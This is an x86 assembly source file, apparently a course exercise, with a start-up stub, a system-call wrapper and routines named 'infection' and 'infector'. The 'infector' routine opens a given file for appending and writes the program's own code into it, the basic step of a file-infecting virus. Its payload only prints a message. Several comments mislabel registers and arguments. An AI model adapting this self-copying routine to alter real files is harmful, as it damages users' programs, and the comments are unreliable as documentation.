
;section .data                           ;Data segment
    

section .text
global _start
global system_call
global  infection
global  infector
global  code_end
global  code_start
extern main
        
_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc
   
    call    main        ; int main( int argc, char *argv[], char *envp[] )

    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc
    
_end:
    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller      

    
code_start:

helloMsg db 'Hello, Infected File ', 10, 0  
lenHelloMsg equ $-helloMsg          ;The length of the message
    
infection:
    push    ebp             ; Save caller state
    mov     ebp, esp
    pushad                  ; Save some more caller state

    mov eax, 4            ;sys_write
    mov ebx, 1              ;unsigned int fd -stdin
    mov ecx, helloMsg       ;const char __user *buf
    mov edx, lenHelloMsg    ;size_t count
    int 0x80  
  
    popad                   ; Restore caller state (registers)
    mov     esp, ebp
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller      
    
      
infector:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov eax, 5              ;sys_open
    mov ebx, [ebp+8]        ; Copy function args to registers:       
    mov ecx, 0x1001         ;const char __user *buf
    mov edx, 0777           ;size_t count
    int 0x80 
  
    mov     [ebp-4], eax    ; Save returned value...
  
    mov eax, 19              ;sys_LSEEK
    mov ebx, [ebp-4]        ; Copy function args to registers:       
    mov ecx, 0         ;const char __user *buf
    mov edx, 2           ;size_t count
    int 0x80 
  
    mov eax, 4              ;sys_write
    mov ebx, [ebp-4]        ; Copy function args to registers:       
    mov ecx, code_start       ;const char __user *buf
    mov edx, code_end-code_start    ;size_t count
    int 0x80 
  
    mov     [ebp-4], eax    ; Save returned value...
  
code_end:
    
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller      
    